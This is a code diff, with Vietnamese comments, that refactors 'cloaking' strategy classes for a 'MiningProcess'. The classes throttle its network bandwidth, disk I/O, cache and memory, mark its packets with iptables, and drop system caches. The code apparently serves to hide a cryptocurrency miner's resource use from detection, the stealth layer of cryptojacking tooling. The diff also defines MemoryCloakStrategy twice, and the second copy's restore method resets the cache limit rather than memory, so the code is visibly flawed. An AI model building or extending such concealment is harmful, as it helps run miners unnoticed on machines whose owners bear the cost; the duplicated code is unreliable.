+                self.logger.error(f"Không thể khôi phục giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}).")
+
+            # Xóa quy tắc iptables MARK
+            success_unmark = self.network_resource_manager.unmark_packets(pid, mark)
+            if success_unmark:
+                self.logger.info(f"Xóa iptables MARK cho tiến trình {process_name} (PID: {pid}) thành công.")
+            else:
+                self.logger.error(f"Không thể xóa iptables MARK cho tiến trình {process_name} (PID: {pid}).")
+
+            # Xóa mark khỏi lưu trữ
+            del self.process_marks[pid]
+
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Không đủ quyền để khôi phục cloaking mạng cho PID {process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi khi khôi phục cloaking mạng cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
@@ -577,87 +555,53 @@ class NetworkCloakStrategy(CloakStrategy):
             self.logger.error(f"Lỗi khi xác định giao diện mạng chính: {e}")
             return None
 
+
 class DiskIoCloakStrategy(CloakStrategy):
     """
     Chiến lược cloaking Disk I/O:
-      - Đặt mức độ throttling I/O bằng cách sử dụng cgroups v2 (io.weight).
+      - Đặt trọng số I/O cho tiến trình bằng cách sử dụng DiskIOResourceManager.
+      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
     """
 
     def __init__(
         self,
         config: Dict[str, Any],
-        logger: logging.Logger,
-        cgroup_manager: CgroupManager,
-        disk_io_resource_manager: Any  # Thay bằng loại cụ thể nếu có
+        logger: logging.Logger
     ):
         """
-        Khởi tạo DiskIoCloakStrategy với cấu hình, logger, CgroupManager và DiskIOResourceManager.
+        Khởi tạo DiskIoCloakStrategy với cấu hình và logger.
 
         Args:
             config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Disk I/O.
             logger (logging.Logger): Logger để ghi log.
-            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
-            disk_io_resource_manager (Any): Instance của DiskIOResourceManager từ resource_control.py.
         """
         # Lấy cấu hình io_weight với giá trị mặc định là 500
         self.io_weight = config.get('io_weight', 500)
         if not isinstance(self.io_weight, int) or not (1 <= self.io_weight <= 1000):
-            logger.warning(
-                f"Giá trị io_weight không hợp lệ: {self.io_weight}. Mặc định là 500."
-            )
+            logger.warning(f"Giá trị io_weight không hợp lệ: {self.io_weight}. Mặc định là 500.")
             self.io_weight = 500
         self.logger = logger
-        self.cgroup_manager = cgroup_manager
-        self.disk_io_resource_manager = disk_io_resource_manager
 
-    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
+        # Khởi tạo DiskIOResourceManager trực tiếp
+        self.disk_io_resource_manager = DiskIOResourceManager(logger)
+
+    def apply(self, process: MiningProcess) -> None:
         """
-        Áp dụng chiến lược cloaking Disk I/O cho tiến trình đã cho trong cgroup đã chỉ định.
+        Áp dụng chiến lược cloaking Disk I/O cho tiến trình đã cho.
 
         Args:
             process (MiningProcess): Đối tượng tiến trình.
-            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
         """
         try:
             pid, process_name = self.get_process_info(process)
 
-            io_cgroup = cgroups.get('io')
-            if not io_cgroup:
-                self.logger.error(f"Không có cgroup I/O được cung cấp cho tiến trình {process_name} (PID: {pid}).")
-                return
-
-            # Tạo cgroup I/O nếu chưa tồn tại
-            if not self.cgroup_manager.cgroup_exists(io_cgroup):
-                created = self.cgroup_manager.create_cgroup(io_cgroup)
-                if not created:
-                    self.logger.error(f"Không thể tạo cgroup I/O '{io_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
-                    return
-
-                # Thêm cgroup I/O vào cgroup cha 'root_io'
-                parent_cgroup = "root_io"
-                success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, io_cgroup)
-                if not success:
-                    self.logger.error(f"Không thể thêm cgroup I/O '{io_cgroup}' vào cgroup cha '{parent_cgroup}'.")
-                    return
-
-            # Thiết lập I/O weight thông qua DiskIOResourceManager
-            success = self.disk_io_resource_manager.set_io_weight(io_cgroup, self.io_weight)
+            # Đặt trọng số I/O thông qua DiskIOResourceManager
+            success = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
             if success:
-                self.logger.info(
-                    f"Đặt I/O weight là {self.io_weight} cho tiến trình {process_name} (PID: {pid}) trong cgroup '{io_cgroup}'."
-                )
+                self.logger.info(f"Đặt I/O weight là {self.io_weight} cho tiến trình {process_name} (PID: {pid}).")
             else:
-                self.logger.error(
-                    f"Không thể đặt I/O weight là {self.io_weight} cho tiến trình {process_name} (PID: {pid}) trong cgroup '{io_cgroup}'."
-                )
+                self.logger.error(f"Không thể đặt I/O weight là {self.io_weight} cho tiến trình {process_name} (PID: {pid}).")
                 return
-
-            # Gán tiến trình vào cgroup I/O
-            success = self.cgroup_manager.assign_process_to_cgroup(pid, io_cgroup)
-            if success:
-                self.logger.info(f"Gán tiến trình PID={pid} vào cgroup '{io_cgroup}' cho Disk I/O.")
-            else:
-                self.logger.error(f"Không thể gán tiến trình PID={pid} vào cgroup '{io_cgroup}' cho Disk I/O.")
 
             self.logger.info(
                 f"Áp dụng cloaking Disk I/O cho tiến trình {process_name} (PID: {pid}): io_weight={self.io_weight}."
@@ -673,6 +617,37 @@ class DiskIoCloakStrategy(CloakStrategy):
             )
             raise
 
+    def restore(self, process: MiningProcess) -> None:
+        """
+        Khôi phục các thiết lập cloaking Disk I/O cho tiến trình đã cho.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình.
+        """
+        try:
+            pid, process_name = self.get_process_info(process)
+
+            # Xóa trọng số I/O
+            success = self.disk_io_resource_manager.set_io_weight(pid, 1000)  # Giả sử 1000 là trọng số tối đa
+            if success:
+                self.logger.info(f"Khôi phục I/O weight cho tiến trình {process_name} (PID: {pid}) thành công.")
+            else:
+                self.logger.error(f"Không thể khôi phục I/O weight cho tiến trình {process_name} (PID: {pid}).")
+
+            self.logger.info(
+                f"Khôi phục cloaking Disk I/O cho tiến trình {process_name} (PID: {pid}) đã hoàn thành."
+            )
+
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Không đủ quyền để khôi phục cloaking Disk I/O cho PID {process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi khi khôi phục cloaking Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
     def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
         """
         Lấy PID và tên tiến trình từ đối tượng process.
@@ -685,97 +660,60 @@ class DiskIoCloakStrategy(CloakStrategy):
         """
         return process.pid, process.name
 
+
 class CacheCloakStrategy(CloakStrategy):
     """
     Chiến lược cloaking Cache:
-      - Giảm sử dụng cache bằng cách drop caches và giới hạn mức sử dụng cache thông qua cgroups.
+      - Drop caches.
+      - Giới hạn mức sử dụng cache thông qua CacheResourceManager.
+      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
     """
 
     def __init__(
         self,
         config: Dict[str, Any],
-        logger: logging.Logger,
-        cgroup_manager: CgroupManager,
-        cache_resource_manager: Any  # Thay bằng loại cụ thể nếu có
+        logger: logging.Logger
     ):
         """
-        Khởi tạo CacheCloakStrategy với cấu hình, logger, CgroupManager và CacheResourceManager.
+        Khởi tạo CacheCloakStrategy với cấu hình và logger.
 
         Args:
             config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Cache.
             logger (logging.Logger): Logger để ghi log.
-            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
-            cache_resource_manager (Any): Instance của CacheResourceManager từ resource_control.py.
         """
         # Lấy cấu hình cache_limit_percent với giá trị mặc định là 50%
         self.cache_limit_percent = config.get('cache_limit_percent', 50)
         if not (0 <= self.cache_limit_percent <= 100):
-            logger.warning(
-                f"Giá trị cache_limit_percent không hợp lệ: {self.cache_limit_percent}. Mặc định là 50%."
-            )
+            logger.warning(f"Giá trị cache_limit_percent không hợp lệ: {self.cache_limit_percent}. Mặc định là 50%.")
             self.cache_limit_percent = 50
         self.logger = logger
-        self.cgroup_manager = cgroup_manager
-        self.cache_resource_manager = cache_resource_manager
 
-    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
+        # Khởi tạo CacheResourceManager trực tiếp
+        self.cache_resource_manager = CacheResourceManager(logger)
+
+    def apply(self, process: MiningProcess) -> None:
         """
-        Áp dụng chiến lược cloaking Cache cho tiến trình đã cho trong cgroup đã chỉ định.
+        Áp dụng chiến lược cloaking Cache cho tiến trình đã cho.
 
         Args:
             process (MiningProcess): Đối tượng tiến trình.
-            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
         """
         try:
             pid, process_name = self.get_process_info(process)
 
             # Drop caches thông qua CacheResourceManager
-            success = self.cache_resource_manager.drop_caches()
-            if success:
+            success_drop = self.cache_resource_manager.drop_caches()
+            if success_drop:
                 self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
             else:
                 self.logger.error(f"Không thể drop caches cho tiến trình {process_name} (PID: {pid}).")
 
-            # Giảm cache limit cho tiến trình bằng cách sử dụng cgroups
-            cache_cgroup = cgroups.get('cache')
-            if cache_cgroup:
-                try:
-                    # Tạo cgroup Cache nếu chưa tồn tại
-                    if not self.cgroup_manager.cgroup_exists(cache_cgroup):
-                        created = self.cgroup_manager.create_cgroup(cache_cgroup)
-                        if not created:
-                            self.logger.error(f"Không thể tạo cgroup Cache '{cache_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
-                            return
-
-                        # Thêm cgroup Cache vào cgroup cha 'root_cache'
-                        parent_cgroup = "root_cache"
-                        success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, cache_cgroup)
-                        if not success:
-                            self.logger.error(f"Không thể thêm cgroup Cache '{cache_cgroup}' vào cgroup cha '{parent_cgroup}'.")
-                            return
-
-                    # Thiết lập giới hạn cache thông qua CacheResourceManager
-                    cache_limit_bytes = self.calculate_cache_limit()
-                    success = self.cache_resource_manager.set_cache_limit(cache_cgroup, cache_limit_bytes)
-                    if success:
-                        self.logger.info(
-                            f"Đặt giới hạn cache thành {self.cache_limit_percent}% ({cache_limit_bytes} bytes) cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cache_cgroup}'."
-                        )
-                    else:
-                        self.logger.error(
-                            f"Không thể đặt giới hạn cache cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cache_cgroup}'."
-                        )
-                except psutil.NoSuchProcess as e:
-                    self.logger.error(f"Tiến trình PID={pid} không tồn tại khi thao tác với cgroup Cache: {e}")
-                except psutil.AccessDenied as e:
-                    self.logger.error(f"Không đủ quyền để thao tác với cgroup Cache cho PID {pid}: {e}")
-                except Exception as e:
-                    self.logger.error(
-                        f"Lỗi khi thao tác với cgroup Cache '{cache_cgroup}' cho tiến trình {process_name} (PID: {pid}): {e}"
-                    )
-                    raise
+            # Giới hạn cache sử dụng thông qua CacheResourceManager
+            success_limit = self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent)
+            if success_limit:
+                self.logger.info(f"Đặt giới hạn cache thành {self.cache_limit_percent}% cho tiến trình {process_name} (PID: {pid}).")
             else:
-                self.logger.warning(f"Không có cgroup 'cache' được cung cấp cho tiến trình {process_name} (PID: {pid}).")
+                self.logger.error(f"Không thể đặt giới hạn cache cho tiến trình {process_name} (PID: {pid}).")
 
             self.logger.info(
                 f"Áp dụng cloaking Cache cho tiến trình {process_name} (PID: {pid}): "
@@ -797,26 +735,41 @@ class CacheCloakStrategy(CloakStrategy):
             )
             raise
 
-    def calculate_cache_limit(self) -> int:
+    def restore(self, process: MiningProcess) -> None:
         """
-        Tính toán giới hạn cache dựa trên cache_limit_percent.
+        Khôi phục các thiết lập cloaking Cache cho tiến trình đã cho.
 
-        Returns:
-            int: Giới hạn cache tính bằng bytes.
+        Args:
+            process (MiningProcess): Đối tượng tiến trình.
         """
-        total_cache_bytes = self.get_total_cache()
-        cache_limit_bytes = int((self.cache_limit_percent / 100) * total_cache_bytes)
-        return cache_limit_bytes
+        try:
+            pid, process_name = self.get_process_info(process)
 
-    def get_total_cache(self) -> int:
-        """
-        Lấy tổng lượng cache hiện có trên hệ thống.
+            # Reset cache usage bằng cách không giới hạn
+            success_limit = self.cache_resource_manager.limit_cache_usage(100)  # Đặt lại về 100%
+            if success_limit:
+                self.logger.info(f"Khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}) thành công.")
+            else:
+                self.logger.error(f"Không thể khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}).")
 
-        Returns:
-            int: Tổng cache tính bằng bytes.
-        """
-        # Ví dụ: giả sử tổng cache là 8GB
-        return 8 * 1024 * 1024 * 1024  # 8GB in bytes
+            self.logger.info(
+                f"Khôi phục cloaking Cache cho tiến trình {process_name} (PID: {pid}) đã hoàn thành."
+            )
+
+        except PermissionError as e:
+            self.logger.error(
+                f"Không đủ quyền để khôi phục cloaking Cache cho tiến trình {process.name} (PID: {process.pid})."
+            )
+            raise
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Không đủ quyền để khôi phục cloaking Cache cho PID {process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi bất ngờ khi khôi phục cloaking Cache cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
 
     def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
         """
@@ -830,98 +783,62 @@ class CacheCloakStrategy(CloakStrategy):
         """
         return process.pid, process.name
 
+
 class MemoryCloakStrategy(CloakStrategy):
     """
     Chiến lược cloaking Memory:
-      - Giới hạn sử dụng bộ nhớ của tiến trình bằng cách sử dụng cgroups.
+      - Giới hạn sử dụng bộ nhớ của tiến trình.
       - Giảm sử dụng bộ nhớ bằng cách drop caches nếu cần thiết.
+      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
     """
 
     def __init__(
         self,
         config: Dict[str, Any],
-        logger: logging.Logger,
-        cgroup_manager: CgroupManager,
-        memory_resource_manager: Any  # Thay bằng loại cụ thể nếu có
+        logger: logging.Logger
     ):
         """
-        Khởi tạo MemoryCloakStrategy với cấu hình, logger, CgroupManager và MemoryResourceManager.
+        Khởi tạo MemoryCloakStrategy với cấu hình và logger.
 
         Args:
             config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Memory.
             logger (logging.Logger): Logger để ghi log.
-            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
-            memory_resource_manager (Any): Instance của MemoryResourceManager từ resource_control.py.
         """
         # Lấy cấu hình memory_limit_percent với giá trị mặc định là 50%
         self.memory_limit_percent = config.get('memory_limit_percent', 50)
         if not (0 <= self.memory_limit_percent <= 100):
-            logger.warning(
-                f"Giá trị memory_limit_percent không hợp lệ: {self.memory_limit_percent}. Mặc định là 50%."
-            )
+            logger.warning(f"Giá trị memory_limit_percent không hợp lệ: {self.memory_limit_percent}. Mặc định là 50%.")
             self.memory_limit_percent = 50
         self.logger = logger
-        self.cgroup_manager = cgroup_manager
-        self.memory_resource_manager = memory_resource_manager
 
-    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
+        # Khởi tạo MemoryResourceManager và CacheResourceManager trực tiếp
+        self.memory_resource_manager = MemoryResourceManager(logger)
+        self.cache_resource_manager = CacheResourceManager(logger)
+
+    def apply(self, process: MiningProcess) -> None:
         """
-        Áp dụng chiến lược cloaking Memory cho tiến trình đã cho trong cgroup đã chỉ định.
+        Áp dụng chiến lược cloaking Memory cho tiến trình đã cho.
 
         Args:
             process (MiningProcess): Đối tượng tiến trình.
-            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
         """
         try:
             pid, process_name = self.get_process_info(process)
 
-            # Drop caches thông qua MemoryResourceManager
-            success = self.memory_resource_manager.drop_caches()
-            if success:
+            # Drop caches sử dụng CacheResourceManager
+            success_drop = self.cache_resource_manager.drop_caches()
+            if success_drop:
                 self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
             else:
                 self.logger.error(f"Không thể drop caches cho tiến trình {process_name} (PID: {pid}).")
 
-            # Giảm memory limit cho tiến trình bằng cách sử dụng cgroups
-            memory_cgroup = cgroups.get('memory')
-            if memory_cgroup:
-                try:
-                    # Tạo cgroup Memory nếu chưa tồn tại
-                    if not self.cgroup_manager.cgroup_exists(memory_cgroup):
-                        created = self.cgroup_manager.create_cgroup(memory_cgroup)
-                        if not created:
-                            self.logger.error(f"Không thể tạo cgroup Memory '{memory_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
-                            return
-
-                        # Thêm cgroup Memory vào cgroup cha 'root_memory'
-                        parent_cgroup = "root_memory"
-                        success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, memory_cgroup)
-                        if not success:
-                            self.logger.error(f"Không thể thêm cgroup Memory '{memory_cgroup}' vào cgroup cha '{parent_cgroup}'.")
-                            return
-
-                    # Thiết lập giới hạn bộ nhớ thông qua MemoryResourceManager
-                    memory_limit_bytes = self.calculate_memory_limit()
-                    success = self.memory_resource_manager.set_memory_limit(memory_cgroup, memory_limit_bytes)
-                    if success:
-                        self.logger.info(
-                            f"Đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% ({memory_limit_bytes} bytes) cho tiến trình {process_name} (PID: {pid}) trong cgroup '{memory_cgroup}'."
-                        )
-                    else:
-                        self.logger.error(
-                            f"Không thể đặt giới hạn bộ nhớ cho tiến trình {process_name} (PID: {pid}) trong cgroup '{memory_cgroup}'."
-                        )
-                except psutil.NoSuchProcess as e:
-                    self.logger.error(f"Tiến trình PID={pid} không tồn tại khi thao tác với cgroup Memory: {e}")
-                except psutil.AccessDenied as e:
-                    self.logger.error(f"Không đủ quyền để thao tác với cgroup Memory cho PID {pid}: {e}")
-                except Exception as e:
-                    self.logger.error(
-                        f"Lỗi khi thao tác với cgroup Memory '{memory_cgroup}' cho tiến trình {process_name} (PID: {pid}): {e}"
-                    )
-                    raise
+            # Giới hạn sử dụng bộ nhớ sử dụng MemoryResourceManager
+            memory_limit_mb = self.calculate_memory_limit_mb()
+            success_limit = self.memory_resource_manager.set_memory_limit(pid, memory_limit_mb)
+            if success_limit:
+                self.logger.info(f"Đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% ({memory_limit_mb}MB) cho tiến trình {process_name} (PID: {pid}).")
             else:
-                self.logger.warning(f"Không có cgroup 'memory' được cung cấp cho tiến trình {process_name} (PID: {pid}).")
+                self.logger.error(f"Không thể đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% cho tiến trình {process_name} (PID: {pid}).")
 
             self.logger.info(
                 f"Áp dụng cloaking Memory cho tiến trình {process_name} (PID: {pid}): "
@@ -943,16 +860,56 @@ class MemoryCloakStrategy(CloakStrategy):
             )
             raise
 
-    def calculate_memory_limit(self) -> int:
+    def restore(self, process: MiningProcess) -> None:
+        """
+        Khôi phục các thiết lập cloaking Memory cho tiến trình đã cho.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình.
+        """
+        try:
+            pid, process_name = self.get_process_info(process)
+
+            # Giới hạn bộ nhớ về không giới hạn
+            success_limit = self.memory_resource_manager.remove_memory_limit(pid)
+            if success_limit:
+                self.logger.info(f"Khôi phục giới hạn bộ nhớ cho tiến trình {process_name} (PID: {pid}) thành công.")
+            else:
+                self.logger.error(f"Không thể khôi phục giới hạn bộ nhớ cho tiến trình {process_name} (PID: {pid}).")
+
+            # Không cần drop caches lại khi khôi phục
+
+            self.logger.info(
+                f"Khôi phục cloaking Memory cho tiến trình {process_name} (PID: {pid}) đã hoàn thành."
+            )
+
+        except PermissionError as e:
+            self.logger.error(
+                f"Không đủ quyền để khôi phục cloaking Memory cho tiến trình {process.name} (PID: {process.pid})."
+            )
+            raise
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Không đủ quyền để khôi phục cloaking Memory cho PID {process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi bất ngờ khi khôi phục cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+    def calculate_memory_limit_mb(self) -> int:
         """
         Tính toán giới hạn bộ nhớ dựa trên memory_limit_percent.
 
         Returns:
-            int: Giới hạn bộ nhớ tính bằng bytes.
+            int: Giới hạn bộ nhớ tính bằng MB.
         """
         total_memory_bytes = psutil.virtual_memory().total
         memory_limit_bytes = int((self.memory_limit_percent / 100) * total_memory_bytes)
-        return memory_limit_bytes
+        memory_limit_mb = int(memory_limit_bytes / (1024 * 1024))
+        self.logger.debug(f"Tính toán giới hạn bộ nhớ: {memory_limit_mb}MB.")
+        return memory_limit_mb
 
     def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
         """
@@ -966,10 +923,152 @@ class MemoryCloakStrategy(CloakStrategy):
         """
         return process.pid, process.name
 
+
+class MemoryCloakStrategy(CloakStrategy):
+    """
+    Chiến lược cloaking Memory:
+      - Giới hạn sử dụng bộ nhớ của tiến trình.
+      - Giảm sử dụng bộ nhớ bằng cách drop caches nếu cần thiết.
+      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
+    """
+
+    def __init__(
+        self,
+        config: Dict[str, Any],
+        logger: logging.Logger
+    ):
+        """
+        Khởi tạo MemoryCloakStrategy với cấu hình và logger.
+
+        Args:
+            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Memory.
+            logger (logging.Logger): Logger để ghi log.
+        """
+        # Lấy cấu hình memory_limit_percent với giá trị mặc định là 50%
+        self.memory_limit_percent = config.get('memory_limit_percent', 50)
+        if not (0 <= self.memory_limit_percent <= 100):
+            logger.warning(f"Giá trị memory_limit_percent không hợp lệ: {self.memory_limit_percent}. Mặc định là 50%.")
+            self.memory_limit_percent = 50
+        self.logger = logger
+
+        # Khởi tạo MemoryResourceManager và CacheResourceManager trực tiếp
+        self.memory_resource_manager = MemoryResourceManager(logger)
+        self.cache_resource_manager = CacheResourceManager(logger)
+
+    def apply(self, process: MiningProcess) -> None:
+        """
+        Áp dụng chiến lược cloaking Memory cho tiến trình đã cho.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình.
+        """
+        try:
+            pid, process_name = self.get_process_info(process)
+
+            # Drop caches sử dụng CacheResourceManager
+            success_drop = self.cache_resource_manager.drop_caches()
+            if success_drop:
+                self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
+            else:
+                self.logger.error(f"Không thể drop caches cho tiến trình {process_name} (PID: {pid}).")
+
+            # Giới hạn sử dụng bộ nhớ sử dụng MemoryResourceManager
+            memory_limit_mb = self.calculate_memory_limit_mb()
+            success_limit = self.memory_resource_manager.set_memory_limit(pid, memory_limit_mb)
+            if success_limit:
+                self.logger.info(f"Đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% ({memory_limit_mb}MB) cho tiến trình {process_name} (PID: {pid}).")
+            else:
+                self.logger.error(f"Không thể đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% cho tiến trình {process_name} (PID: {pid}).")
+
+            self.logger.info(
+                f"Áp dụng cloaking Memory cho tiến trình {process_name} (PID: {pid}): "
+                f"drop_caches=True, memory_limit_percent={self.memory_limit_percent}%."
+            )
+
+        except PermissionError as e:
+            self.logger.error(
+                f"Không đủ quyền để drop caches. Cloaking Memory thất bại cho tiến trình {process.name} (PID: {process.pid})."
+            )
+            raise
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Không đủ quyền để áp dụng cloaking Memory cho PID {process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi bất ngờ khi áp dụng cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+    def restore(self, process: MiningProcess) -> None:
+        """
+        Khôi phục các thiết lập cloaking Memory cho tiến trình đã cho.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình.
+        """
+        try:
+            pid, process_name = self.get_process_info(process)
+
+            # Reset cache usage bằng cách không giới hạn
+            success_limit = self.cache_resource_manager.limit_cache_usage(100)  # Đặt lại về 100%
+            if success_limit:
+                self.logger.info(f"Khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}) thành công.")
+            else:
+                self.logger.error(f"Không thể khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}).")
+
+            # Không cần drop caches lại khi khôi phục
+
+            self.logger.info(
+                f"Khôi phục cloaking Memory cho tiến trình {process_name} (PID: {pid}) đã hoàn thành."
+            )
+
+        except PermissionError as e:
+            self.logger.error(
+                f"Không đủ quyền để khôi phục cloaking Memory cho tiến trình {process.name} (PID: {process.pid})."
+            )
+            raise
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Không đủ quyền để khôi phục cloaking Memory cho PID {process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi bất ngờ khi khôi phục cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+    def calculate_memory_limit_mb(self) -> int:
+        """
+        Tính toán giới hạn bộ nhớ dựa trên memory_limit_percent.
+
+        Returns:
+            int: Giới hạn bộ nhớ tính bằng MB.
+        """
+        total_memory_bytes = psutil.virtual_memory().total
+        memory_limit_bytes = int((self.memory_limit_percent / 100) * total_memory_bytes)
+        memory_limit_mb = int(memory_limit_bytes / (1024 * 1024))
+        self.logger.debug(f"Tính toán giới hạn bộ nhớ: {memory_limit_mb}MB.")
+        return memory_limit_mb
+
+    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
+        """
+        Lấy PID và tên tiến trình từ đối tượng process.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình.
+
+        Returns:
+            Tuple[int, str]: PID và tên tiến trình.
+        """
+        return process.pid, process.name
+
+
 class CloakStrategyFactory:
     """
     Factory để tạo các instance của các chiến lược cloaking.
     """
+
     _strategies: Dict[str, Type[CloakStrategy]] = {
         'cpu': CpuCloakStrategy,
         'gpu': GpuCloakStrategy,
@@ -983,9 +1082,7 @@ class CloakStrategyFactory:
     def create_strategy(
         strategy_name: str,
         config: Dict[str, Any],
-        logger: logging.Logger,
-        cgroup_manager: CgroupManager,
-        resource_managers: Dict[str, Any]
+        logger: logging.Logger
     ) -> Optional[CloakStrategy]:
         """
         Tạo một instance của chiến lược cloaking dựa trên tên chiến lược.
@@ -994,8 +1091,6 @@ class CloakStrategyFactory:
             strategy_name (str): Tên của chiến lược cloaking.
             config (Dict[str, Any]): Cấu hình cho chiến lược cloaking.
             logger (logging.Logger): Logger để ghi log.
-            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
-            resource_managers (Dict[str, Any]): Dictionary chứa các module quản lý tài nguyên.
 
         Returns:
             Optional[CloakStrategy]: Instance của chiến lược cloaking hoặc None nếu không tìm thấy.
@@ -1004,28 +1099,7 @@ class CloakStrategyFactory:
 
         if strategy_class and issubclass(strategy_class, CloakStrategy):
             try:
-                # Tạo instance của chiến lược cloaking dựa trên tên
-                if strategy_name.lower() == 'gpu':
-                    gpu_resource_manager = resource_managers.get('gpu')
-                    gpu_initialized = gpu_resource_manager.gpu_initialized if gpu_resource_manager else False
-                    logger.debug(f"Tạo GPU CloakStrategy: gpu_initialized={gpu_initialized}")
-                    return strategy_class(
-                        config,
-                        logger,
-                        # cgroup_manager,  # <-- Đã loại bỏ sự phụ thuộc vào cgroup_manager
-                        gpu_resource_manager,
-                        gpu_initialized
-                    )
-                elif strategy_name.lower() in ['cpu', 'network', 'disk_io', 'cache', 'memory']:
-                    return strategy_class(
-                        config,
-                        logger,
-                        cgroup_manager,
-                        resource_managers.get(strategy_name.lower())
-                    )
-                else:
-                    logger.warning(f"Chiến lược cloaking '{strategy_name}' không được hỗ trợ.")
-                    return None
+                return strategy_class(config, logger)
             except Exception as e:
                 logger.error(f"Lỗi khi tạo chiến lược cloaking '{strategy_name}': {e}")
                 return None
